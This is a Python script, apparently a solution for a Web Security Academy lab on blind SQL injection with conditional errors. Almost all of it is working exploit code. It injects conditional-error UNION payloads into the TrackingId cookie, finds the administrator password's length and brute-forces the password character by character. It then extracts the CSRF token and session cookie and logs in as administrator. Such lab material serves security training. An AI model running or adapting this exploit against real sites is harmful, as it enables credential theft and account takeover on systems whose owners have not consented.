#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 23/9/2023
#
# Lab: Blind SQL injection with conditional errors
#
# Steps: 1. Inject payload into 'TrackingId' cookie to determine the length of
#           administrator's password based on conditional errors
#        2. Modify the payload to brute force the administrator's password
#        3. Fetch the login page
#        4. Extract csrf token and session cookie
#        5. Login as the administrator
#        6. Fetch the administrator profile
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re


#########################################
# Function to determine password length
#########################################
def determin_password_length(url):
    for length in range(1, 50):
        print(Fore.WHITE + "1. Checking if password length = " +
              Fore.YELLOW + str(length), flush=True, end='\r')
        try:
            # payload to determine password length
            payload = f"' UNION SELECT CASE WHEN (length((select password from users where username = 'administrator')) = {length}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -"
            cookies = {
                "TrackingId": payload
            }
            # fetch the page with the injected payload
            injection = requests.get(
                f"{url}/filter?category=Pets", cookies=cookies)

            # if the server returns an error which means the condition is true and a char is found
            if injection.status_code == 500:
                print(Fore.WHITE + "1. Checking if password length = " +
                      Fore.YELLOW + str(length) + Fore.WHITE + " [ Correct length: " +
                      Fore.GREEN + str(length) + Fore.WHITE + " ]")

                return length
        except:
            print(
                Fore.RED + "[!] Failed to inject the payload to determine the password length through exception")


#####################################
# Function to brute force password
#####################################
def brute_force_password(url, password_length):
    correct_password = []
    for position in range(1, password_length+1):
        for character in "0123456789abcdefghijklmnopqrstuvwxyz":
            print(Fore.WHITE + "\r2. Checking if char at position " +
                  Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
            try:
                # payload to brute force password
                payload = f"' UNION SELECT CASE WHEN (substr((select password from users where username = 'administrator'), {position}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -"
                cookies = {
                    "TrackingId": payload
                }
                # fetch the page with the injected payload
                injection = requests.get(
                    f"{url}/filter?category=Pets", cookies=cookies)

                # if the server returns an error which means the condition is true and a char is found
                if injection.status_code == 500:
                    correct_password.append(character)
                    print(Fore.WHITE + "\r2. Checking if char at position " +
                          Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " +
                          Fore.GREEN + "".join(correct_password) + Fore.WHITE + " ]", flush=True, end='\r')
                    break
                else:
                    continue
            except:
                print(
                    Fore.RED + "[!] Failed to inject the payload while brute forcing administrator's password through exception")
    return "".join(correct_password)


#########
# Main
#########
# change this to your lab URL
url = "https://0a94001a0463579f8416500a00df00a7.web-security-academy.net"
print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")

# determine password length
password_length = determin_password_length(url)
# brute force password
admin_password = brute_force_password(url, password_length)

try:  # fetch login page
    fetch_login = requests.get(f"{url}/login")
    print(Fore.WHITE + "\n3. Fetching login page.. " + Fore.GREEN + "OK")
    # extract session cookie
    session = fetch_login.cookies.get("session")
    # extract csrf token
    csrf = re.findall("csrf.+value=\"(.+)\"",
                      fetch_login.content.decode())[0]
    print(
        Fore.WHITE + "4. Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

    try:  # login in as the administrator
        data = {
            "username": "administrator",
            "password": admin_password,
            "csrf": csrf
        }
        cookies = {
            "session": session
        }
        login = requests.post(f"{url}/login", data,
                              cookies=cookies, allow_redirects=False)
        print(
            Fore.WHITE + "5. Logging in as the administrator.. " + Fore.GREEN + "OK")
        # extract new session
        new_session = login.cookies.get("session")
        cookies = {
            "session": new_session
        }
        try:  # fetch the administrator profile
            admin = requests.get(
                f"{url}/my-account", cookies=cookies)
            print(
                Fore.WHITE + "6. Fetching the administrator profile.. " + Fore.GREEN + "OK")
            print(
                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
        except:
            print(
                Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
    except:
        print(
            Fore.RED + "[!] Failed to login as the administrator through exception")
except:
    print(
        Fore.RED + "[!] Failed to fetch login page through exception")
